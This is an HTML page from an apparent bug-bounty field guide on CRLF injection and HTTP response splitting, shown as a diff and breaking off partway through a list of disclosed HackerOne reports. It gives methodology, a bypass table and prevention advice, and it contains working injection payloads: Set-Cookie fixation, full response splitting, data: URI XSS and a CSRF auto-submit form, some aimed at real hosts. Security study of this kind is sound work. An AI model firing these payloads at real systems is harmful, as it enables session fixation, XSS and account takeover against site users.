@@ -1,0 +1,410 @@
+<!doctype html><html lang="en"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>CRLF / HTTP Response Splitting · The Hacktivity Field Guide</title>
+<meta name="description" content="">
+<link rel="icon" href="/favicon.jpg">
+<script>try{var t=localStorage.getItem('fg-theme');if(t)document.documentElement.setAttribute('data-theme',t);}catch(e){}</script>
+<link rel="stylesheet" href="../assets/style.css">
+<script>window.SITE_ROOT="../";</script>
+</head><body>
+<div class="ethics" id="ethics"><b>⚠ Authorized testing only.</b> Disclosed public bug-bounty data for defensive/educational research. Use payloads only against systems you are permitted to test. <button id="ethicsX">Dismiss</button></div>
+<div class="top">
+  <button class="hamb" id="hamb" aria-label="Open navigation">☰</button>
+  <a class="brand" href="../index.html"><img class="seal" src="/favicon.jpg" alt="Logo"><span>The Hacktivity Field Guide<small>Real-world web hacking, catalogued</small></span></a>
+  <a class="tbtn" href="/" aria-label="Main site" title="Gill.Singh.A" style="text-decoration:none">⌂</a><div class="searchwrap"><span class="mag">🔎</span><input id="q" type="search" placeholder="Search techniques, programs, report IDs…" autocomplete="off" aria-label="Search"><div class="results" id="results"></div></div>
+  <button class="tbtn" id="themeBtn" aria-label="Toggle light/dark">◐</button>
+</div>
+<div class="crumb"><a href="../index.html">Field Guide</a><span class="sep">/</span><b>Vulnerabilities</b><span class="sep">/</span><b>CRLF / HTTP Response Splitting</b></div>
+<div class="shell">
+  <aside class="side" id="side" aria-label="Taxonomy"><div class="nav">
+<a class="navhome" href="../index.html">⌂ Home</a>
+<div class="nav-h">Methodology</div>
+<a href="../methodology/recon.html">Recon</a>
+<a href="../methodology/choosing-targets.html">Choosing targets</a>
+<a href="../methodology/triage-and-impact.html">Triage & impact</a>
+<a href="../methodology/reporting.html">Reporting</a>
+<div class="nav-h">Injection</div>
+<a class="" href="../vulnerabilities/sqli.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>SQL Injection<span class="n">122</span></a>
+<a class="" href="../vulnerabilities/command-injection.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>OS Command Injection<span class="n">85</span></a>
+<a class="" href="../vulnerabilities/code-injection.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Code Injection<span class="n">86</span></a>
+<a class="" href="../vulnerabilities/ssti.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Server-Side Template Injection<span class="n">14</span></a>
+<a class="" href="../vulnerabilities/injection-other.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>LDAP / XML / Other Injection<span class="n">77</span></a>
+<a class="on" href="../vulnerabilities/crlf-http-splitting.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>CRLF / HTTP Response Splitting<span class="n">22</span></a>
+<a class="" href="../vulnerabilities/xxe.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>XML External Entities (XXE)<span class="n">25</span></a>
+<a class="" href="../vulnerabilities/rfi.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Remote File Inclusion<span class="n">4</span></a>
+<div class="nav-h">Client-side</div>
+<a class="" href="../vulnerabilities/xss.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Cross-Site Scripting (XSS)<span class="n">936</span></a>
+<a class="" href="../vulnerabilities/csrf.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Cross-Site Request Forgery (CSRF)<span class="n">144</span></a>
+<a class="" href="../vulnerabilities/clickjacking.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Clickjacking<span class="n">20</span></a>
+<a class="" href="../vulnerabilities/open-redirect.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Open Redirect<span class="n">151</span></a>
+<a class="" href="../vulnerabilities/spoofing-phishing.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Content Spoofing &amp; Phishing<span class="n">74</span></a>
+<div class="nav-h">Access control</div>
+<a class="" href="../vulnerabilities/idor.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>IDOR / BOLA<span class="n">248</span></a>
+<a class="" href="../vulnerabilities/access-control.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Broken Access Control<span class="n">494</span></a>
+<a class="" href="../vulnerabilities/privilege-escalation.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Privilege Escalation<span class="n">88</span></a>
+<a class="" href="../vulnerabilities/mass-assignment.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Mass Assignment<span class="n">16</span></a>
+<div class="nav-h">Auth & session</div>
+<a class="" href="../vulnerabilities/auth.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Authentication &amp; ATO<span class="n">181</span></a>
+<a class="" href="../vulnerabilities/session.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Session Management<span class="n">61</span></a>
+<div class="nav-h">Server-side</div>
+<a class="" href="../vulnerabilities/ssrf.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Server-Side Request Forgery (SSRF)<span class="n">181</span></a>
+<a class="" href="../vulnerabilities/path-traversal.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Path Traversal / LFI<span class="n">181</span></a>
+<a class="" href="../vulnerabilities/deserialization.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Insecure Deserialization<span class="n">69</span></a>
+<a class="" href="../vulnerabilities/request-smuggling.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>HTTP Request Smuggling<span class="n">33</span></a>
+<a class="" href="../vulnerabilities/cache.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Web Cache Poisoning &amp; Deception<span class="n">36</span></a>
+<a class="" href="../attack-surface/file-upload.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>File Upload<span class="n">66</span></a>
+<div class="nav-h">Logic & infra</div>
+<a class="" href="../vulnerabilities/business-logic.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Business Logic Flaws<span class="n">267</span></a>
+<a class="" href="../vulnerabilities/race-condition.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Race Conditions<span class="n">42</span></a>
+<a class="" href="../vulnerabilities/dos-resource.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Denial of Service<span class="n">296</span></a>
+<a class="" href="../vulnerabilities/misconfiguration.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Security Misconfiguration<span class="n">119</span></a>
+<a class="" href="../vulnerabilities/unclassified.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Protocol, Config &amp; Infra Injection (long tail)<span class="n">218</span></a>
+<a class="" href="../vulnerabilities/supply-chain.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Supply Chain &amp; Malicious Code<span class="n">31</span></a>
+<a class="" href="../vulnerabilities/logging.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Logging &amp; Monitoring Failures<span class="n">14</span></a>
+<div class="nav-h">Disclosure & crypto</div>
+<a class="" href="../vulnerabilities/info-disclosure.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Information Disclosure<span class="n">568</span></a>
+<a class="" href="../vulnerabilities/crypto.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Cryptographic Issues<span class="n">91</span></a>
+<a class="" href="../vulnerabilities/mitm.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Man-in-the-Middle<span class="n">12</span></a>
+<div class="nav-h">Binary</div>
+<a class="" href="../vulnerabilities/memory-corruption.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Memory Corruption<span class="n">324</span></a>
+<div class="nav-h">Emerging</div>
+<a class="" href="../vulnerabilities/llm-ai.html"><span class="dot" style="background:var(--sev-med)" title="Medium"></span>LLM / AI Attacks<span class="n">3</span></a>
+<div class="nav-h">Attack surface</div>
+<a class="" href="../attack-surface/graphql.html">GraphQL<span class="n">42</span></a>
+<a class="" href="../attack-surface/oauth.html">OAuth 2.0 / OIDC<span class="n">62</span></a>
+<a class="" href="../attack-surface/jwt.html">JSON Web Tokens (JWT)<span class="n">10</span></a>
+<a class="" href="../attack-surface/saml.html">SAML<span class="n">5</span></a>
+<a class="" href="../attack-surface/cors.html">CORS Misconfiguration<span class="n">22</span></a>
+<a class="" href="../attack-surface/subdomain-takeover.html">Subdomain Takeover<span class="n">121</span></a>
+<a class="" href="../attack-surface/account-takeover.html">Account Takeover Chains<span class="n">101</span></a>
+<a class="" href="../attack-surface/file-upload.html">File Upload<span class="n">66</span></a>
+<a class="" href="../attack-surface/cloud-aws.html">Cloud Metadata &amp; Keys</a>
+<a class="" href="../attack-surface/webhooks.html">Webhooks &amp; Integrations</a>
+<a class="" href="../attack-surface/mobile.html">Mobile &amp; Thick-Client</a>
+<div class="nav-h">Field notes</div>
+<a href="../chains.html">Exploit chains</a><a href="../payloads.html">Payload libraries</a>
+</div></aside>
+  <main class="main">
+    <header class="entry-head">
+      <div class="kicker"><span class="dot" style="background:var(--sev-high)"></span>Vulnerabilities</div>
+      <h1>CRLF / HTTP Response Splitting</h1>
+      <div class="meta-row"><span class="chip">Specimens <b>22</b></span><a class="chip lab" href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">⚑ Practice — PortSwigger: <b>Request smuggling</b></a></div>
+    </header>
+    
+    <h2 class="sec" id="basic-information"><span class="tick">§</span>Basic information</h2>
+<p>CRLF injection is putting a carriage-return/line-feed pair (<code>\r\n</code>, sent as <code>%0d%0a</code>) into data that the server copies <strong>verbatim into a response header</strong>. HTTP separates headers with CRLF, so one injected CRLF terminates the current header and starts a <strong>new header you control</strong> (<code>Set-Cookie</code>, <code>Content-Type</code>, <code>X-XSS-Protection</code>); a <em>doubled</em> CRLF terminates the header block entirely and lets you write a full <strong>response body</strong> — this is "HTTP response splitting".</p>
+<p>The primitive is almost never the goal. CRLF is a <strong>delivery mechanism</strong>: an injected <code>Set-Cookie</code> gives you cookie fixation and cookie-tossing; a forged <code>Content-Type: text/html</code> + body gives you reflected XSS; a doubled response cached by a proxy gives you cache poisoning and defacement. The sink is always the same — request input (usually a path or query param) reflected into a response header, most often a 302 <code>Location</code>.</p>
+<h2 class="sec" id="methodology"><span class="tick">§</span>Methodology</h2>
+<ol><li><strong>Find header reflections.</strong> For every path segment, query param, and <code>redirect_uri</code>/<code>ref</code>/<code>shop</code>/<code>t</code>-style value, look for it echoed into a response header — the redirect <code>Location</code> above all.</li><li><strong>Fire a canary header</strong> after an encoded CRLF and read the <strong>raw</strong> response in Burp (not the rendered view). If your fake header appears on its own line, you have injection.</li><li><strong>Probe every newline variant</strong> — servers filter unevenly (<code>%0d%0a</code>, <code>%0a</code>, bare <code>%0d</code>, folded <code>%0d%0a%09</code>).</li><li><strong>Climb the confirmation ladder:</strong> canary header lands → inject <code>Set-Cookie</code> → inject a <em>doubled</em> CRLF + body to prove full response splitting.</li><li><strong>Weaponize</strong> for the context: cookie fixation → CSRF bypass, forged <code>Content-Type</code> → XSS, or a second cached response → poisoning.</li></ol>
+<div class="pre" data-lang="http"># Canary — inject an obviously-fake header after the reflected value, read raw response
+GET /path%0d%0aX-Injected:%20crlf-canary HTTP/1.1
+Host: TARGET
+# Tell: raw response contains a line   X-Injected: crlf-canary</div>
+<div class="callout warn"><span class="ico">▲ WARNING</span><div>Read the <strong>raw</strong> response bytes, not the browser-rendered page or Burp's pretty view — a proxy or the rendering layer may re-fold or hide the injected header. <code>curl -i</code> is the fastest ground truth (#153794).</div></div>
+<h2 class="sec" id="technique-variants"><span class="tick">§</span>Technique variants</h2>
+<p>Once a canary header lands, pick the escalation that fits the sink.</p>
+<h3 class="sub" id="inject-a-cookie-the-workhorse">Inject a cookie (the workhorse)</h3>
+<p>Split off a <code>Set-Cookie</code> line. Scope it to the <strong>parent domain</strong> (<code>domain=.TARGET</code>) so a single subdomain redirect writes a cookie sent to every sibling — the base for cookie-tossing, session fixation, and CSRF token overwrite.</p>
+<div class="pre" data-lang="http">GET /advanced%0d%0aSet-Cookie:test=1;domain=.TARGET HTTP/1.1
+Host: TARGET
+# Resulting response line:  Set-Cookie: test=1;domain=.TARGET</div>
+<h3 class="sub" id="full-response-splitting">Full response splitting</h3>
+<p>A <strong>doubled</strong> CRLF ends the real header block; everything after it is a body you author. Add <code>Content-Length: 0</code> to truncate the original response, then write a complete second HTTP response (defacement, XSS, or cache-poison payload).</p>
+<div class="pre" data-lang="http">GET /last_shop?shop=x%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2019%0d%0a%0d%0a&lt;html&gt;deface&lt;/html&gt; HTTP/1.1
+Host: TARGET</div>
+<h3 class="sub" id="reflected-xss-via-forged-content-type">Reflected XSS via forged Content-Type</h3>
+<p>The sink is almost always a 3xx redirect, so the browser will follow the original <code>Location</code> before it ever renders your body. Defeat this by also injecting a <code>Location:</code> header (empty, or a dead value like <code>//x:1</code>) to neutralize the redirect. Then forge <code>Content-Type: text/html</code> so the browser parses your body as HTML, inject <code>X-XSS-Protection:0</code> on the <strong>same</strong> forged response to kill the legacy auditor, and append your script after the header-terminating blank line.</p>
+<div class="pre" data-lang="http">GET /%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert(document.domain)%3C%2fscript%3E HTTP/1.1
+Host: TARGET</div>
+<h3 class="sub" id="data-uri-xss-in-a-location-header">data: URI XSS in a Location header</h3>
+<p>When open-redirect hardening blocks <code>http(s)</code> targets in the injected <code>Location</code> but the browser still navigates to and executes a <code>data:</code> scheme (Firefox), a <code>data:text/html</code> value carried into the redirect target yields XSS anyway. The content after the CRLF becomes the effective <code>Location</code> value directly — no second <code>Location:</code> header is injected (a duplicated header would just be ignored).</p>
+<div class="pre" data-lang="http">GET /%0d%0adata:text/html;text,%3Csvg%2fonload%3Dprompt(document.domain)%3E HTTP/1.1
+Host: TARGET</div>
+<h3 class="sub" id="content-type-content-spoofing">Content-Type / content spoofing</h3>
+<p>Even without full script execution, forging <code>Content-Type</code> on an error or reflection page lets you spoof content (text/html, or a fake JSON/plaintext body) — useful for phishing or defeating a same-response defense.</p>
+<div class="pre" data-lang="http">GET /error?msg=x%0d%0aContent-Type:text/html%0d%0a%0d%0a%3Ch1%3Efake%20login%3C%2fh1%3E HTTP/1.1
+Host: TARGET</div>
+<h2 class="sec" id="bypasses"><span class="tick">§</span>Bypasses</h2>
+<div style="overflow-x:auto"><table class="bx"><thead><tr><th>Filter / control</th><th>Bypass</th><th>Seen in</th></tr></thead><tbody><tr><td>Filter strips <code>\n</code> only</td><td>use bare <code>%0d</code> (CR-only) — splits headers everywhere except Firefox</td><td>#79552, #66386</td></tr><tr><td>Byte-level newline filter</td><td>UTF-8 multibyte whose low byte is <code>0x0A</code>/<code>0x0D</code> (<code>%E5%98%8A</code>→LF, <code>%E5%98%8D</code>→CR) when the app truncates a decoded char to its last byte</td><td>#52042</td></tr><tr><td>CRLF sanitized, looks un-injectable</td><td>pad the reflected param past ~7 KB so the server discards and <strong>regenerates</strong> the response <em>with</em> the injected header</td><td>#53843</td></tr><tr><td>Bare CRLF blocked</td><td>RFC1945 header <strong>folding</strong> <code>%0d%0a%09</code> (CR-LF-TAB) — permissive clients (old IE, backported PHP) treat the continuation line as a real header</td><td>#145392</td></tr><tr><td>Server pins cookie <code>Domain</code></td><td><code>Domain =</code> (extra space) + <code>%44</code> for <code>D</code> defeats the domain-normalizer</td><td>#97292</td></tr><tr><td>Open-redirect filter on <code>Location</code></td><td><code>data:text/html</code> URI executes where <code>http(s)</code> targets are blocked</td><td>#177624</td></tr></tbody></table></div>
+<div class="callout tip"><span class="ico">▸ TIP</span><div>Newline honoring is client-specific, so test across a browser matrix. A bare <code>%0d</code> splits headers in Chrome/IE but not Firefox; <code>data:</code> and folded headers behave the opposite way. What "doesn't reproduce" in one browser often fires in another (#66386, #145392).</div></div>
+<h2 class="sec" id="escalation-impact"><span class="tick">§</span>Escalation &amp; impact</h2>
+<p>The injected cookie is the real pivot — the header injection is just the vehicle.</p>
+<ul><li><strong>CRLF → cookie fixation → double-submit CSRF bypass</strong> — fix <code>csrf_token</code> to a value you know via <code>Set-Cookie</code>, then auto-submit a form carrying the <em>same</em> value; the double-submit check compares two attacker-controlled values and passes (#79552, #245485).</li><li><strong>Parent-domain cookie tossing / session fixation</strong> — <code>domain=.TARGET</code> from any subdomain redirect writes to the apex; if the app doesn't rotate the session cookie post-login, this is a login-fixation account-takeover primitive (#97292, #66386, #245485).</li><li><strong>CRLF → response splitting → cache poisoning / defacement</strong> — a split response cached by a proxy/CDN is served to <em>every</em> user of that URL (#106427, #53843).</li><li><strong>CRLF → reflected XSS</strong> — forged <code>Content-Type</code> + body, or a <code>data:</code> <code>Location</code> (#192667, #177624) — escalates to full account takeover via session theft (see the XSS page).</li></ul>
+<h2 class="sec" id="prevention"><span class="tick">§</span>Prevention</h2>
+<ul><li><strong>Strip or reject CR and LF</strong> — and their encoded, multibyte, and folded forms — from any value placed into a header. A byte-level newline blocklist is not enough; <strong>normalize, then validate</strong> (#52042).</li><li>Use modern header APIs that refuse <code>\r</code>/<code>\n</code> at the stack level. The framework-level fixes for WEBrick (#153794), Ruby <code>cgi</code> (#1889474, #1889477), and Python <code>urllib</code> (#165102) made every app on those stacks non-exploitable even where the sink existed.</li><li><strong>Allowlist redirect targets</strong> — never reflect a raw request path or <code>redirect_uri</code> into <code>Location</code>.</li><li>Scope cookies with the <code>Host-</code> prefix and no wildcard <code>Domain</code> to blunt the cookie-tossing escalation; rotate session cookies on login to defeat fixation.</li><li>A CRLF finding with no cookie/XSS/cache impact (a lone injected canary header) usually closes as low/informative — always demonstrate one of the escalations above.</li></ul>
+<h2 class="sec" id="tools"><span class="tick">§</span>Tools</h2>
+<ul><li><strong>Burp Suite</strong> — Repeater with the <strong>raw</strong> response tab to see injected header lines; Intruder to sweep the newline matrix (<code>%0d</code>, <code>%0a</code>, <code>%0d%0a</code>, <code>%0d%0a%09</code>).</li><li><strong><code>curl -i</code></strong> — fastest raw header inspection, immune to render-layer re-folding (#153794).</li><li><strong>Collaborator / interactsh</strong> — confirm cache-poisoned responses are served to third parties.</li><li><strong>Browser matrix</strong> (Chrome / Firefox / IE) — honoring of bare CR, <code>data:</code> <code>Location</code>, and folded headers is client-specific.</li></ul>
+    <h2 class="sec" id="specimens"><span class="tick">✦</span>Specimens — real-world examples</h2>
+    <p>The techniques above are the general method. Below, each disclosed HackerOne report is a catalogued example — concrete payload, outcome, and matching practice lab. <b>22</b> in this class.</p>
+    <div class="sortbar"><label for="sort">Sort specimens:</label>
+      <select id="sort"><option value="score">Best first</option><option value="votes">Most votes</option><option value="bounty">Highest bounty</option><option value="sev">Severity</option></select>
+      <span style="margin-left:auto;color:var(--muted);font-size:12px" id="showing"></span></div>
+    <div class="specimens" id="specimens"><article class="spec" id="report-1889474" style="--sv:var(--sev-high)" data-sev="3" data-votes="7" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>HTTP response splitting in Ruby cgi gem (CVE-2021-33621)</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#1889474</b> · ibb · none · 7 votes · resolved</div>
+<div class="taxo"><span>Program <b>ibb</b></span><span>Surface <b>web</b></span><span>Chain <b>CRLF in cgi output -&gt; response splitting / Set-Cookie att</b></span><span>Tag <b>webhook</b></span></div>
+<h4>Root cause</h4><p style="margin:0">CVE-2021-33621: the Ruby cgi gem did not sanitize CR/LF when generating HTTP responses from untrusted input, and CGI::Cookie did not validate its contents, allowing header/body injection and Set-Cookie attribute injection.</p>
+<h4>Method</h4><ol><li>Find an app that builds responses/headers or CGI::Cookie objects from user input using the cgi gem (&lt; 0.3.5/0.2.2/0.1.0.2).</li><li>Inject CR/LF into the reflected value to split headers or the body.</li><li>Alternatively inject invalid attributes into a Set-Cookie via CGI::Cookie from user input.</li></ol>
+<div class="pre"># untrusted value reaching CGI header/cookie output:
+value = "x\r\nSet-Cookie: injected=1\r\n\r\n&lt;script&gt;..."</div>
+<p class="insight"><b>Insight —</b> Library-level CRLF: when a framework/gem writes user data into headers, the sink may be the library rather than app code. For Ruby, cgi gem versions before the fix are a known response-splitting sink; audit dependency versions, not just app handlers.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1889474" target="_blank" rel="noopener">hackerone.com/reports/1889474</a></span><a class="src" href="#report-1889474" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-79552" style="--sv:var(--sev-high)" data-sev="3" data-votes="6" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>CRLF Set-Cookie injection chained to CSRF double-submit bypass</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#79552</b> · gratipay · USD 40 · 6 votes · resolved</div>
+<div class="taxo"><span>Program <b>gratipay</b></span><span>Surface <b>web</b></span><span>Chain <b>CRLF -&gt; Set-Cookie cookie fixation -&gt; double-submit CS</b></span><span>Tag <b>webhook</b></span></div>
+<h4>Root cause</h4><p style="margin:0">User-controlled path segment is reflected into the Location response header without stripping CR; a lone %0d (\r, honored by all browsers except Firefox) injects a Set-Cookie line, letting the attacker fixate any cookie on the domain.</p>
+<h4>Method</h4><ol><li>Request a URL with %0d before an injected header to split the Location response: http://TARGET/%0dSet-Cookie:csrf_token=ATTACKER;</li><li>Confirm the response emits your Set-Cookie line under the target origin.</li><li>Use the injected cookie to defeat double-submit CSRF: force csrf_token to a known value, then auto-submit a matching hidden form.</li></ol>
+<div class="pre">http://gratipay.com/%0dSet-Cookie:csrf_token=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
+
+&lt;form id=csrf action="https://gratipay.com/~fickov/statement.json" method=POST&gt;
+ &lt;input type=hidden name=csrf_token value="xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"&gt;
+ &lt;input type=hidden name=content value=CSRF_TEST&gt;&lt;/form&gt;
+&lt;img src="http://gratipay.com/%0dSet-Cookie:csrf_token=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;" onerror=csrf.submit()&gt;</div>
+<p class="insight"><b>Insight —</b> Any reflection into a redirect Location header is a CRLF sink. A bare %0d is enough on Chrome/IE. The real impact is not the header itself but the chain: injected Set-Cookie enables cookie fixation, and against double-submit CSRF tokens you fix both the cookie and the form field to the same value, nullifying the protection.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/79552" target="_blank" rel="noopener">hackerone.com/reports/79552</a></span><a class="src" href="#report-79552" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-446271" style="--sv:var(--sev-med)" data-sev="2" data-votes="439" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>CRLF injection in query param -&gt; HTTP response header splitting</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#446271</b> · x · awarded · 439 votes · resolved</div>
+<div class="taxo"><span>Program <b>x</b></span><span>Surface <b>web</b></span><span>Tag <b>crlf-http-splitting</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A URL/query parameter was reflected into a response header without stripping CR/LF, letting an attacker inject arbitrary headers (e.g. Set-Cookie) via %0d%0a.</p>
+<h4>Method</h4><ol><li>Find a param reflected into a Location/redirect or other response header</li><li>Inject %0d%0a followed by a header</li><li>Confirm the injected header appears in the response</li></ol>
+<div class="pre">https://ads.twitter.com/subscriptions/mobile/landing?t=%0d%0aSet-Cookie:%20csrf_id=injection%3b
+https://ads.twitter.com/subscriptions/mobile/landing?ref=x?t=%0d%0atest:tested</div>
+<p class="insight"><b>Insight —</b> Any parameter echoed into a response header (redirect targets, tracking refs) is a CRLF candidate; %0d%0a to inject Set-Cookie (session fixation) or split the response.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/446271" target="_blank" rel="noopener">hackerone.com/reports/446271</a></span><a class="src" href="#report-446271" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-177624" style="--sv:var(--sev-med)" data-sev="2" data-votes="25" data-bounty="140">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>CRLF injection into Location header -&gt; data: URI XSS</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#177624</b> · bumble · 140 · 25 votes · resolved</div>
+<div class="taxo"><span>Program <b>bumble</b></span><span>Surface <b>web</b></span><span>Chain <b>CRLF header injection -&gt; XSS</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The path is reflected into the response Location header; injecting %0d%0a splits the header and the server hardening blocks external/HTTP redirects, but a data:text/html URI in the injected Location still triggers script execution.</p>
+<h4>Method</h4><ol><li>Inject %0d%0a into the URL so content after it lands in the Location header</li><li>Since external URL redirects are blocked, supply a data:text/html Location value</li><li>Browser (Firefox) navigates to the data URI and executes the svg/onload</li></ol>
+<div class="pre">https://TARGET/%0d%0adata:text/html;text,%3Csvg%2fonload%3Dprompt%281%29%3E</div>
+<p class="insight"><b>Insight —</b> When a CRLF-injectable Location header is hardened against http(s) open-redirects, a data: URI can still yield XSS in browsers that navigate/execute data-scheme Location values.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/177624" target="_blank" rel="noopener">hackerone.com/reports/177624</a></span><a class="src" href="#report-177624" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-171473" style="--sv:var(--sev-med)" data-sev="2" data-votes="13" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>CRLF injection / HTTP response splitting via reflected parameter</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#171473</b> · owox · none · 13 votes · resolved</div>
+<div class="taxo"><span>Program <b>owox</b></span><span>Surface <b>web</b></span><span>Tag <b>supply-chain</b></span></div>
+<h4>Root cause</h4><p style="margin:0">User input is reflected into an HTTP response header without stripping CR/LF, so %0d%0a lets an attacker inject arbitrary response headers (and potentially split the response / set cookies).</p>
+<h4>Method</h4><ol><li>Find a parameter reflected into a response header (Location, Set-Cookie, custom)</li><li>Inject %0d%0a&lt;Header&gt;: &lt;value&gt; and confirm the new header appears</li><li>Escalate to cookie injection, cache poisoning, or reflected XSS via header split</li></ol>
+<div class="pre">?param=foo%0d%0aInjected-Header:%20pwned</div>
+<p class="insight"><b>Insight —</b> Probe redirect/header-reflecting params with %0d%0a; a returned injected header confirms response splitting. Impact depends on what you can set (Set-Cookie, cache headers, content-type for XSS).</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/171473" target="_blank" rel="noopener">hackerone.com/reports/171473</a></span><a class="src" href="#report-171473" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-66386" style="--sv:var(--sev-med)" data-sev="2" data-votes="5" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>CRLF injection via Request-URI reflected into Location → Set-Cookie on parent domain</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#66386</b> · shopify · awarded · 5 votes · resolved</div>
+<div class="taxo"><span>Program <b>shopify</b></span><span>Surface <b>web</b></span><span>Chain <b>CRLF -&gt; cookie injection on *.domain -&gt; CSRF double-su</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The redirect handler copies the raw request path into the Location response header without stripping CR/LF, so an encoded newline in the URL injects an arbitrary response header (Set-Cookie) scoped to the whole parent domain.</p>
+<h4>Method</h4><ol><li>Append a URL-encoded CR/LF plus an injected header to the request path</li><li>Server emits the path in Location, with the injected Set-Cookie as a new header line</li><li>Set a cookie scoped to .parentdomain (usable for cookie-tossing / CSRF double-submit bypass / session fixation)</li></ol>
+<div class="pre"># %0a (\n) variant (Shopify):
+http://www.myshopify.com/xxcrlftest%0aSet-Cookie:test=test3;domain=.myshopify.com;
+
+# %0d (\r-only) variant works in every browser except Firefox (from #154275, ownCloud):
+http://doc.owncloud.org/%23%0dSet-Cookie:crlf=injection;domain=.owncloud.org;</div>
+<p class="insight"><b>Insight —</b> Any endpoint echoing the request path/param into a Location or other response header is a CRLF candidate — test %0d, %0a, and %0d%0a; \r alone (%0d) still splits headers in most browsers. A parent-domain Set-Cookie is a primitive for cookie-tossing, CSRF double-submit-cookie bypass, and session fixation, not just self-harm.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/66386" target="_blank" rel="noopener">hackerone.com/reports/66386</a></span><a class="src" href="#report-66386" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-245485" style="--sv:var(--sev-med)" data-sev="2" data-votes="4" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Path-based CRLF injection to set attacker-controlled domain-scoped cookie</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#245485</b> · deptofdefense · none · 4 votes · resolved</div>
